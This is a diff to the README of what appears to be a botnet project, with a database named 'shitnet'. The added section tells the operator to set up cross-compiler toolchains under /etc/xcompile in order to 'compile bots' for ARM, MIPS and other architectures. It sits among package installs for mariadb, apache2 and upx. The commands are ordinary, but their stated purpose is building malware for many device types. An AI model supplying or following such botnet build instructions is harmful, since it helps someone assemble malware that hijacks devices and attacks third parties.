@@ -27,6 +27,25 @@ Run these commands in your terminal to set up the environment and dependencies:
 sudo apt update && sudo apt upgrade -y
 sudo apt install git gcc make go-sql-driver-mysql mariadb-server screen apache2 upx unzip -y
 
+🛠️ Cross-Compiler (xcompile) Setup
+To compile bots for different architectures (ARM, MIPS, etc.), you must set up the toolchains in /etc/xcompile:
+
+Create Directory:
+
+Bash
+sudo mkdir -p /etc/xcompile
+Extract Toolchains: Download and extract the compilers into the directory. Ensure the path structure is: /etc/xcompile/[arch]/bin/[arch]-gcc 
+(check release section for compiler file)
+
+Bash
+cd /etc/xcompile
+# Example: Extracting a toolchain
+sudo tar -xvf cross-compiler-i486.tar.gz 
+Set Permissions:
+
+Bash
+sudo chmod -R 755 /etc/xcompile
+
 sudo systemctl start mariadb
 sudo mysql -u root <<EOF
 CREATE DATABASE IF NOT EXISTS shitnet;
